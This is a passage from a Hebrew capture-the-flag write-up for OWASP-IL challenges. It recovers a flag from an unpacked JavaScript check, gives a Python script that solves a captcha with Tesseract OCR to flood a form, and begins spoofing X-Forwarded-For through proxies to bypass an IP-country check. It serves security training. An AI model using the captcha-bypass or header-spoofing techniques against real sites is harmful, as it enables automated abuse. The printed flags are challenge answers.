id="Picture 23" src="images/image022.jpg">
(באותה מידה אפשר
לבצע את התהליך באמצעות ה-Web Developer Console של הדפדפן, או פשוט סקריפט בדף HTML).
שוב נשתמש ב-Unpacker ונקבל:
```javascript
function verify(a)
{
    if(a.charCodeAt(0x0)=="79"&&a.charCodeAt(0x1)=="87"&&a.charCodeAt(0x2)=="65"&&a.charCodeAt(0x3)=="83"&&a.charCodeAt(0x4)=="80"&&a.charCodeAt(0x5)=="45"&&a.charCodeAt(0x6)=="73"&&a.charCodeAt(0x7)=="76"&&a.charCodeAt(0x8)=="123"&&a.charCodeAt(0x9)=="74"&&a.charCodeAt(0xa)=="52"&&a.charCodeAt(0xb)=="118"&&a.charCodeAt(0xc)=="52"&&a.charCodeAt(0xd)=="83"&&a.charCodeAt(0xe)=="99"&&a.charCodeAt(0xf)=="114"&&a.charCodeAt(0x10)=="49"&&a.charCodeAt(0x11)=="112"&&a.charCodeAt(0x12)=="116"&&a.charCodeAt(0x13)=="78"&&a.charCodeAt(0x14)=="105"&&a.charCodeAt(0x15)=="110"&&a.charCodeAt(0x16)=="106"&&a.charCodeAt(0x17)=="52"&&a.charCodeAt(0x18)=="33"&&a.charCodeAt(0x19)=="125")
    {
        console.log("Contratz! You got the flag!\nFlag: "+a)
    }
    else
    {
        console.log("You are so wrong.. :)")
    }
}
```
הלוגיקה פה מספיק
קצרה וברורה בשביל שיהיה קל לייצר קוד ידני שמגלה מהו הדגל, למשל:
```javascript
a = Array();
a[0x0]="79"; a[0x1]="87"; a[0x2]="65"; a[0x3]="83"; a[0x4]="80"; a[0x5]="45"; 
a[0x6]="73"; a[0x7]="76"; a[0x8]="123"; a[0x9]="74"; a[0xa]="52"; a[0xb]="118"; 
a[0xc]="52"; a[0xd]="83"; a[0xe]="99"; a[0xf]="114"; a[0x10]="49"; a[0x11]="112"; 
a[0x12]="116"; a[0x13]="78"; a[0x14]="105"; a[0x15]="110"; a[0x16]="106"; 
a[0x17]="52"; a[0x18]="33"; a[0x19]="125";
s = "";
for (var i in a) {
    s += String.fromCharCode(a[i]);
}
console.log(s);
```
הדגל הוא:
OWASP-IL{J4v4Scr1ptNinj4!}
&nbsp;
אתגר 5 - Break The Captcha (רמת קושי
קלה, 250 נקודות)
&nbsp;
הוראות האתגר:
My website is protected with Captcha so you cant flood my
forms!
Do you think that you can bypass it with code and flood my form?
URL: http://challenges.owaspil.ctf.today:8088/
פתרון:
האתר עצמו נראה כך:
עבור הפתרון השתמשתי
ב- Tesseract – ספריה לביצוע OCR. 
ה-captcha שהאתר השתמש בו היה
פשוט ביותר, ללא רעש או הפרעות בתמונה, וספריית Tesseract התמודדה איתו בצורה טובה יחסית. מדי פעם הספרייה הייתה מפספסת,
אבל אפשר היה להמשיך לנסות את התמונה הבאה (הדרישה הייתה לפענח 15 תמונות בחצי
דקה, אך לא הייתה דרישה לרצף פענוחים כלשהו).
הקוד:
```python
from PIL import Image
import pytesseract
import requests
CAPTCHA_BASE_URL = 'http://challenges.owaspil.ctf.today:8088'
with requests.Session() as s:
    for i in range(45):
           print ("-" * 15)
           print (i)
           url = CAPTCHA_BASE_URL + '/captcha.php'
           response = s.get(url, stream=True)
           guess = pytesseract.image_to_string(Image.open(response.raw))
           print (guess)
           payload = {'captcha': guess, "submit": ""}
           response = s.post(CAPTCHA_BASE_URL, data=payload)
           if "flag" in response.text:
                print (response.text)
                break
```
הדגל:
OWASP-IL{YouAreTheCaptchaMaster!} 
&nbsp;
אתגר 6 - Around the world (רמת קושי
קלה, 300 נקודות)
&nbsp;
הוראות האתגר:
Hi you! Do you think that you traveled the world? Your
mission is to enter to our site with IP that belongs to country that we request
you
Can you do that? (XFF is approved)
URL: http://challenges.owaspil.ctf.today:8094/
פתרון:
כניסה לאתר מציגה את
ההודעה הבאה:
In order to get the flag you must to serve
from Argentina (You served from Israel)| Counter: 0\16
האתגר אומר בפירוש
ש-XFF מותר, לכן כמובן
נשתמש ב-X-Forwarded-For (זהו שדה
בכותרת של HTTP שמשמש
לזיהוי כתובת ה-IP המקורית של
הלקוח במידה והוא משתמש בפרוקסי. כמובן שאין מניעה להשתמש בשדה הזה גם אם לא
נמצאים מאחורי פרוקסי, או אפילו להשתמש בכתובת של פרוקסי כפי שנעשה פה).
ראשית צריך למצוא
רשימת פרוקסים ממדינות שונות.
הרשימה שמצאתי הייתה
בנויה בפורמט הבא:
```
201.20.99.10:3130     Brazil
90.161.42.152:40057   Spain
92.38.45.57:42273     Russia
```
&nbsp;
הקוד בסך הכל צריך
לחפש פרוקסי מתאים לפי הדרישה של האתר, ולכלול אותו ב-<span lang=EN-US